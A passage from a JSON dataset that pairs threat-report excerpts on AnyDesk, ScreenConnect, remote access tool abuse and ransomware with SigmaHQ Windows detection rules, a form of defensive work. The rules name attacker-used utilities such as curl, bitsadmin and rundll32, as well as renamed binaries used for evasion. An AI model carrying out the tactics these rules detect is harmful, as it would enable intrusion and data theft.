      "falsepositives": [
        "Legitimate piping of the password to anydesk",
        "Some FP could occur with similar tools that uses the same command line '--set-password'"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_anydesk_piped_password_via_cli.yml"
  },
  "432": {
    "url": "https://www.bleepingcomputer.com/news/security/anydesk-says-hackers-breached-its-production-servers-reset-passwords/",
    "markdown": "# AnyDesk says hackers breached its production servers, reset passwords February 2, 2024 AnyDesk confirmed today that it suffered a recent cyberattack that allowed hackers to gain access to the company's production systems. BleepingComputer has learned that source code and private code signing keys were stolen during the attack. AnyDesk is a remote access solution that allows users to remotely access computers over a network or the internet. The program is very popular with the enterprise, which use it for remote support or to access colocated servers. The software is also popular among threat actors who use it for persistent",
    "sigma_rule": {
      "title": "Remote Access Tool - AnyDesk Execution With Known Revoked Signing Certificate",
      "id": "41f407b5-3096-44ea-a74f-96d04fbc41be",
      "status": "test",
      "description": "Detects the execution of an AnyDesk binary with a version prior to 8.0.8.\nPrior to version 8.0.8, the Anydesk application used a signing certificate that got compromised by threat actors.\nUse this rule to detect instances of older versions of Anydesk using the compromised certificate\nThis is recommended in order to avoid attackers leveraging the certificate and signing their binaries to bypass detections.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/anydesk-says-hackers-breached-its-production-servers-reset-passwords/",
        "https://anydesk.com/en/changelog/windows"
      ],
      "author": "Sai Prashanth Pulisetti, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-02-08",
      "tags": [
        "attack.execution",
        "attack.initial-access"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\AnyDesk.exe"
          },
          {
            "Description": "AnyDesk"
          },
          {
            "Product": "AnyDesk"
          },
          {
            "Company": "AnyDesk Software GmbH"
          }
        ],
        "selection_version": {
          "FileVersion|startswith": [
            "7.0.",
            "7.1.",
            "8.0.1",
            "8.0.2",
            "8.0.3",
            "8.0.4",
            "8.0.5",
            "8.0.6",
            "8.0.7"
          ]
        },
        "filter_main_uninstall": {
          "CommandLine|contains": [
            " --remove",
            " --uninstall"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_anydesk_revoked_cert.yml"
  },
  "433": {
    "url": "https://anydesk.com/en/changelog/windows",
    "markdown": "# Changelog ## Version 8.1.0 **18 Sep 2024** ### Features - Added URL based License Registration mechanism that allows registering a license via link. - The name of Address Book Entries is now shown in the tab header when connecting to them. - Update panel now shows both the installed and to-be-installed versions of AnyDesk. ### Bugfixes - Fixed bug that caused some messages to not show up after license registration. - Fixed bug that prevented some Custom Client settings to work. - Fixed some textual bugs in settings. - Fixed some DPI related visual bugs. - Fixed bug that",
    "sigma_rule": {
      "title": "Remote Access Tool - AnyDesk Execution With Known Revoked Signing Certificate",
      "id": "41f407b5-3096-44ea-a74f-96d04fbc41be",
      "status": "test",
      "description": "Detects the execution of an AnyDesk binary with a version prior to 8.0.8.\nPrior to version 8.0.8, the Anydesk application used a signing certificate that got compromised by threat actors.\nUse this rule to detect instances of older versions of Anydesk using the compromised certificate\nThis is recommended in order to avoid attackers leveraging the certificate and signing their binaries to bypass detections.\n",
      "references": [
        "https://www.bleepingcomputer.com/news/security/anydesk-says-hackers-breached-its-production-servers-reset-passwords/",
        "https://anydesk.com/en/changelog/windows"
      ],
      "author": "Sai Prashanth Pulisetti, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2024-02-08",
      "tags": [
        "attack.execution",
        "attack.initial-access"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\AnyDesk.exe"
          },
          {
            "Description": "AnyDesk"
          },
          {
            "Product": "AnyDesk"
          },
          {
            "Company": "AnyDesk Software GmbH"
          }
        ],
        "selection_version": {
          "FileVersion|startswith": [
            "7.0.",
            "7.1.",
            "8.0.1",
            "8.0.2",
            "8.0.3",
            "8.0.4",
            "8.0.5",
            "8.0.6",
            "8.0.7"
          ]
        },
        "filter_main_uninstall": {
          "CommandLine|contains": [
            " --remove",
            " --uninstall"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_anydesk_revoked_cert.yml"
  },
  "434": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows",
    "markdown": "# T1219 - Remote Access Software ## Description from ATT&CK An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) Remote access tools may be installed and used post-compromise",
    "sigma_rule": {
      "title": "Remote Access Tool - Anydesk Execution From Suspicious Folder",
      "id": "065b00ca-5d5c-4557-ac95-64a6d0b64d86",
      "related": [
        {
          "id": "b52e84a3-029e-4529-b09b-71d19dd27e94",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows",
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-05-20",
      "modified": "2025-02-24",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\AnyDesk.exe",
              "\\AnyDeskMSI.exe"
            ]
          },
          {
            "Description": "AnyDesk"
          },
          {
            "Product": "AnyDesk"
          },
          {
            "Company": "AnyDesk Software GmbH"
          }
        ],
        "filter": {
          "Image|contains": [
            "\\AppData\\",
            "Program Files (x86)\\AnyDesk",
            "Program Files\\AnyDesk"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate use of AnyDesk from a non-standard folder"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_anydesk_susp_exec.yml"
  },
  "435": {
    "url": "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/",
    "markdown": "# Confluence Exploit Leads to LockBit Ransomware **Categories:** exploit, lockbit, ransomware **Published on:** February 24, 2025 ## Key Takeaways - The intrusion began with the exploitation of CVE-2023-22527 on an exposed Windows Confluence server, ultimately leading to the deployment of LockBit ransomware across the environment. - The threat actor leveraged various tools, including Mimikatz, Metasploit, and AnyDesk. - The threat actor leveraged RDP for lateral movement, deploying LockBit ransomware through multiple methods, including copying files over SMB shares for remote execution and automated distribution via PDQ Deploy. - Sensitive data was exfiltrated using Rclone, transferring files to MEGA.io cloud storage.",
    "sigma_rule": {
      "title": "Remote Access Tool - Anydesk Execution From Suspicious Folder",
      "id": "065b00ca-5d5c-4557-ac95-64a6d0b64d86",
      "related": [
        {
          "id": "b52e84a3-029e-4529-b09b-71d19dd27e94",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-2---anydesk-files-detected-test-on-windows",
        "https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-05-20",
      "modified": "2025-02-24",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\AnyDesk.exe",
              "\\AnyDeskMSI.exe"
            ]
          },
          {
            "Description": "AnyDesk"
          },
          {
            "Product": "AnyDesk"
          },
          {
            "Company": "AnyDesk Software GmbH"
          }
        ],
        "filter": {
          "Image|contains": [
            "\\AppData\\",
            "Program Files (x86)\\AnyDesk",
            "Program Files\\AnyDesk"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Legitimate use of AnyDesk from a non-standard folder"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_anydesk_susp_exec.yml"
  },
  "436": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs The only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it. Originally published: August 19, 2021. Last modified: October 1, 2024. --- Red Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines. Adversarial abuse of remote monitoring & management (RMM) software is not new, but—given the",
    "sigma_rule": {
      "title": "Remote Access Tool - NetSupport Execution From Unusual Location",
      "id": "37e8d358-6408-4853-82f4-98333fca7014",
      "status": "test",
      "description": "Detects execution of client32.exe (NetSupport RAT) from an unusual location (outside of 'C:\\Program Files')",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-19",
      "modified": "2024-11-23",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\client32.exe"
          },
          {
            "Product|contains": "NetSupport Remote Control"
          },
          {
            "OriginalFileName|contains": "client32.exe"
          },
          {
            "Hashes|contains": "IMPHASH=a9d50692e95b79723f3e76fcf70d023e"
          }
        ],
        "filter": {
          "Image|startswith": [
            "C:\\Program Files\\",
            "C:\\Program Files (x86)\\"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_netsupport_susp_exec.yml"
  },
  "437": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs The only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it. Originally published: August 19, 2021. Last modified: October 1, 2024. --- Red Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines. Adversarial abuse of remote monitoring & management (RMM) software is not new, but—given the",
    "sigma_rule": {
      "title": "Remote Access Tool - RURAT Execution From Unusual Location",
      "id": "e01fa958-6893-41d4-ae03-182477c5e77d",
      "status": "test",
      "description": "Detects execution of Remote Utilities RAT (RURAT) from an unusual location (outside of 'C:\\Program Files')",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-19",
      "modified": "2023-03-05",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": [
              "\\rutserv.exe",
              "\\rfusclient.exe"
            ]
          },
          {
            "Product": "Remote Utilities"
          }
        ],
        "filter": {
          "Image|startswith": [
            "C:\\Program Files\\Remote Utilities",
            "C:\\Program Files (x86)\\Remote Utilities"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_rurat_non_default_location.yml"
  },
  "438": {
    "url": "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
    "markdown": "# Left On Read: Telegram Malware Spotted in Latest Iranian Cyber Espionage Activity **February 24, 2022** --- In November 2021, Mandiant Managed Defense detected and responded to an UNC3313 intrusion at a Middle East government customer. During the investigation, Mandiant identified new targeted malware, GRAMDOOR and STARWHALE, which implement simple backdoor functionalities. We also identified UNC3313 using publicly available remote access software to maintain access to the environment. UNC3313 initially gained access to this organization through a targeted phishing email and leveraged modified, open-source offensive security tools to identify accessible systems and move laterally. UNC3313 moved rapidly to establish remote",
    "sigma_rule": {
      "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
      "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
      "related": [
        {
          "id": "d1a401ab-8c47-4e86-a7d8-2460b6a53e4a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n",
      "references": [
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
        "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), @Kostastsale",
      "date": "2022-02-25",
      "modified": "2024-02-28",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentCommandLine|contains|all": [
            ":\\Windows\\TEMP\\ScreenConnect\\",
            "run.cmd"
          ],
          "Image|endswith": [
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\curl.exe",
            "\\dllhost.exe",
            "\\net.exe",
            "\\nltest.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\rundll32.exe",
            "\\wevtutil.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "If the script being executed make use of any of the utilities mentioned in the detection then they should filtered out or allowed."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml"
  },
  "439": {
    "url": "https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode",
    "markdown": "# Backstage mode **Last updated**: Jul 24, 2024 ## Available for these licenses: - Standard - Premium - Access ## Introduction Backstage mode allows hosts to access a remote machine without disrupting the user. While hosts can run commands from the Host page, Backstage mode provides a simple, time-saving interface to access important troubleshooting tools including: - ScreenConnect File Manager – A custom file explorer that allows for copy-and-paste file transfer - PowerShell - Windows command prompt - Computer Management - Registry Editor - Event Viewer - Services - Resource Monitor - System Information - Windows Defender Firewall - Notepad",
    "sigma_rule": {
      "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
      "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
      "related": [
        {
          "id": "d1a401ab-8c47-4e86-a7d8-2460b6a53e4a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n",
      "references": [
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
        "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), @Kostastsale",
      "date": "2022-02-25",
      "modified": "2024-02-28",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentCommandLine|contains|all": [
            ":\\Windows\\TEMP\\ScreenConnect\\",
            "run.cmd"
          ],
          "Image|endswith": [
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\curl.exe",
            "\\dllhost.exe",
            "\\net.exe",
            "\\nltest.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\rundll32.exe",
            "\\wevtutil.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "If the script being executed make use of any of the utilities mentioned in the detection then they should filtered out or allowed."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml"
  },
  "440": {
    "url": "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
    "markdown": "# SlashAndGrab: ScreenConnect Post-Exploitation in the Wild (CVE-2024-1709 & CVE-2024-1708) **February 23, 2024** --- ## Table of Contents: - Adversaries Deploying Ransomware - Adversaries Enumerating - Adversary Cryptocurrency Miners - Adversaries Installing Additional Remote Access - Downloading Tools and Payloads - Adversaries Dropping Cobalt Strike - Adversaries Persisting - Wrapping Up - Appendix --- Since February 19, Huntress has been sharing technical details of the ScreenConnect vulnerability we’re calling “SlashAndGrab.” In previous posts, we shared the details of this vulnerability, its exploit, and shared detection guidance. In this article, we’ve collected and curated threat actor activity fresh from the Huntress",
    "sigma_rule": {
      "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
      "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
      "related": [
        {
          "id": "d1a401ab-8c47-4e86-a7d8-2460b6a53e4a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n",
      "references": [
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
        "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), @Kostastsale",
      "date": "2022-02-25",
      "modified": "2024-02-28",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentCommandLine|contains|all": [
            ":\\Windows\\TEMP\\ScreenConnect\\",
            "run.cmd"
          ],
          "Image|endswith": [
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\curl.exe",
            "\\dllhost.exe",
            "\\net.exe",
            "\\nltest.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\rundll32.exe",
            "\\wevtutil.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "If the script being executed make use of any of the utilities mentioned in the detection then they should filtered out or allowed."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml"
  },
  "441": {
    "url": "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html",
    "markdown": "# Threat Actor Groups, Including Black Basta, are Exploiting Recent ScreenConnect Vulnerabilities **Exploits & Vulnerabilities** **February 27, 2024** This blog entry gives a detailed analysis of these recent ScreenConnect vulnerabilities. We also discuss our discovery of threat actor groups, including Black Basta and Bl00dy Ransomware gangs, that are actively exploiting CVE-2024-1708 and CVE-2024-1709 based on our telemetry. --- ## A look at CVE-2024-1708 and CVE-2024-1709 The vulnerabilities have been assigned CVE identifiers, reflecting their severity and the necessity for prompt remediation: ### 1. CVE-2024-1708: Path-Traversal Vulnerability **Description:** This vulnerability affects ConnectWise ScreenConnect 23.9.7 and prior versions. It allows attackers unauthorized",
    "sigma_rule": {
      "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
      "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
      "related": [
        {
          "id": "d1a401ab-8c47-4e86-a7d8-2460b6a53e4a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n",
      "references": [
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
        "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), @Kostastsale",
      "date": "2022-02-25",
      "modified": "2024-02-28",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentCommandLine|contains|all": [
            ":\\Windows\\TEMP\\ScreenConnect\\",
            "run.cmd"
          ],
          "Image|endswith": [
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\curl.exe",
            "\\dllhost.exe",
            "\\net.exe",
            "\\nltest.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\rundll32.exe",
            "\\wevtutil.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "If the script being executed make use of any of the utilities mentioned in the detection then they should filtered out or allowed."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml"
  },
  "442": {
    "url": "https://www.autohotkey.com/download/",
    "markdown": "",
    "sigma_rule": {
      "title": "Renamed AutoHotkey.EXE Execution",
      "id": "0f16d9cf-0616-45c8-8fad-becc11b5a41c",
      "status": "test",
      "description": "Detects execution of a renamed autohotkey.exe binary based on PE metadata fields",
      "references": [
        "https://www.autohotkey.com/download/",
        "https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2023-02-07",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Product|contains": "AutoHotkey"
          },
          {
            "Description|contains": "AutoHotkey"
          },
          {
            "OriginalFileName": [
              "AutoHotkey.exe",
              "AutoHotkey.rc"
            ]
          }
        ],
        "filter": [
          {
            "Image|endswith": [
              "\\AutoHotkey.exe",
              "\\AutoHotkey32.exe",
              "\\AutoHotkey32_UIA.exe",
              "\\AutoHotkey64.exe",
              "\\AutoHotkey64_UIA.exe",
              "\\AutoHotkeyA32.exe",
              "\\AutoHotkeyA32_UIA.exe",
              "\\AutoHotkeyU32.exe",
              "\\AutoHotkeyU32_UIA.exe",
              "\\AutoHotkeyU64.exe",
              "\\AutoHotkeyU64_UIA.exe"
            ]
          },
          {
            "Image|contains": "\\AutoHotkey"
          }
        ],
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_autohotkey.yml"
  },
  "443": {
    "url": "https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/",
    "markdown": "",
    "sigma_rule": {
      "title": "Renamed AutoHotkey.EXE Execution",
      "id": "0f16d9cf-0616-45c8-8fad-becc11b5a41c",
      "status": "test",
      "description": "Detects execution of a renamed autohotkey.exe binary based on PE metadata fields",
      "references": [
        "https://www.autohotkey.com/download/",
        "https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/"
      ],
      "author": "Nasreddine Bencherchali",
      "date": "2023-02-07",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Product|contains": "AutoHotkey"
          },
          {
            "Description|contains": "AutoHotkey"
          },
          {
            "OriginalFileName": [
              "AutoHotkey.exe",
              "AutoHotkey.rc"
            ]
          }
        ],
        "filter": [
          {
            "Image|endswith": [
              "\\AutoHotkey.exe",
              "\\AutoHotkey32.exe",
              "\\AutoHotkey32_UIA.exe",
              "\\AutoHotkey64.exe",
              "\\AutoHotkey64_UIA.exe",
              "\\AutoHotkeyA32.exe",
              "\\AutoHotkeyA32_UIA.exe",
              "\\AutoHotkeyU32.exe",
              "\\AutoHotkeyU32_UIA.exe",
              "\\AutoHotkeyU64.exe",
              "\\AutoHotkeyU64_UIA.exe"
            ]
          },
          {
            "Image|contains": "\\AutoHotkey"
          }
        ],
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_autohotkey.yml"
  },
  "444": {
    "url": "https://securelist.com/locked-out/68960/",
    "markdown": "# ‘Locked Out’ **Publications** **12 Mar 2015** ## The evolution of encrypters and user errors Today the great majority of malware is created with the aim of enrichment. One of the tactics often used by evildoers is to encrypt files and demand a ransom for their decryption. Kaspersky Lab classes such programs as Trojan-Ransom malware, although there is another widely used and resonant name – **encrypters**. Encrypters have become a serious problem for users, especially corporate users. And related topics attract the most posts and readers on our forum. Despite all the efforts of the anti-virus companies we don’t expect",
    "sigma_rule": {
      "title": "Renamed Gpg.EXE Execution",
      "id": "ec0722a3-eb5c-4a56-8ab2-bf6f20708592",
      "status": "test",
      "description": "Detects the execution of a renamed \"gpg.exe\". Often used by ransomware and loaders to decrypt/encrypt data.",
      "references": [
        "https://securelist.com/locked-out/68960/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), frack113",
      "date": "2023-08-09",
      "tags": [
        "attack.impact",
        "attack.t1486"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "OriginalFileName": "gpg.exe"
        },
        "filter_main_img": {
          "Image|endswith": [
            "\\gpg.exe",
            "\\gpg2.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_gpg4win.yml"
  },
  "445": {
    "url": "https://redcanary.com/blog/rclone-mega-extortion/",
    "markdown": "# Transferring leverage in a ransomware attack **Defenders can sabotage double extortion ransomware schemes by detecting unusual file transfer utilities such as Mega and Rclone.** *Originally published May 4, 2021. Last modified July 19, 2024.* --- Ransomware has always been about leverage, and sometimes, just encrypting files is enough to get a payment. However, as organizations have gotten better about data backup and recovery practices—by implementing policies like the “3-2-1 rule,” for example—ransomware operators find themselves having to apply more and different kinds of leverage. A so-called “double extortion” scheme, where an adversary encrypts files and threatens to leak stolen",
    "sigma_rule": {
      "title": "Renamed MegaSync Execution",
      "id": "643bdcac-8b82-49f4-9fd9-25a90b929f3b",
      "status": "test",
      "description": "Detects the execution of a renamed MegaSync.exe as seen used by ransomware families like Nefilim, Sodinokibi, Pysa, and Conti.",
      "references": [
        "https://redcanary.com/blog/rclone-mega-extortion/"
      ],
      "author": "Sittikorn S",
      "date": "2021-06-22",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "OriginalFileName": "megasync.exe"
        },
        "filter": {
          "Image|endswith": "\\megasync.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Software that illegally integrates MegaSync in a renamed form",
        "Administrators that have renamed MegaSync"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_megasync.yml"
  },
  "446": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs The only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it. Originally published: August 19, 2021. Last modified: October 1, 2024. --- Red Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines. Adversarial abuse of remote monitoring & management (RMM) software is not new, but—given the",
    "sigma_rule": {
